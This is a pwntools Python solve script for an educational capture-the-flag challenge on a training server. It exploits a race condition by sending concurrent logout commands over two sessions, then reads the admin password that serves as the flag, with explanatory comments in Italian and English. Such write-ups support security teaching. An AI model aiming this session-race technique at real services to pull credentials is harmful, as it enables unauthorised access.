from pwn import *

def get_token(c):
    c.recvuntil(b"token: ")       # Quando facciamo la prima connessione, ci viene stampato: "Initialized  private instance with token: 3c8..." so we read till "token "
    return c.recvline().strip()   # We read until the end of the line (so we read <token_value>\n) and we do .strip() to remove the \n -> we return the token value

# function to perform the login
def login(c):
    c.recvuntil(b"> ")
    c.sendline(b"1")
    c.recvuntil(b"Enter username: ")
    c.sendline(b"user")
    c.recvuntil(b"Enter password")
    c.sendline(b"supersecurepassword")

# function to perform the COMPLETE logout: this is actually not useful and we will see why
def logout(c):
    c.recvuntil(b"> ")
    c.sendline(b"2")
    c.recvuntil(b"Logout succesful\n")

# function to retrieve the admin password (so, the flag)
def get_flag(c):
    c.recvuntil(b"> ")
    c.sendline(b"4")               # The number 4 prints the username and password of the admin, and the password is the flag
    c.recvline()                   # Here we read the username
    return c.recvline().strip()    # Here we read the password and return it (so, the flag)

#first connection is to the server that gives us the token 
c_token = remote("underprivileged.training.offensivedefensive.it", 8080, ssl=True)
token = get_token(c_token)
c_token.close()                                 # we can close the connection to the server to get the token
#print(token)


# Now we connect to our private process instance for the real challenge
c_1 = remote("private.training.offensivedefensive.it", 8080, ssl=True)  # first thread
c_1.recvuntil(b"Token: ")                                               # we will be asked the token, so we send it
c_1.sendline(token)
c_2 = remote("private.training.offensivedefensive.it", 8080, ssl=True)  # second thread
c_2.recvuntil(b"Token: ")                                               # we will be asked the token, so we send it
c_2.sendline(token)

while(1): 
    # perform the login on the first connection (this is visible also in the second one)
    login(c_1)

    # perform the logout with both connections. This is actually wrong because in this way we are synchronizing the two connections (see notion for details)
    # logout(c_1)
    # logout(c_2)

    c_1.recvuntil(b"> ")
    c_2.recvuntil(b"> ")
    c_1.sendline(b"2")
    c_2.sendline(b"2")

    # try to get flag
    print( get_flag(c_1)[:55]) 

# c_2.interactive()



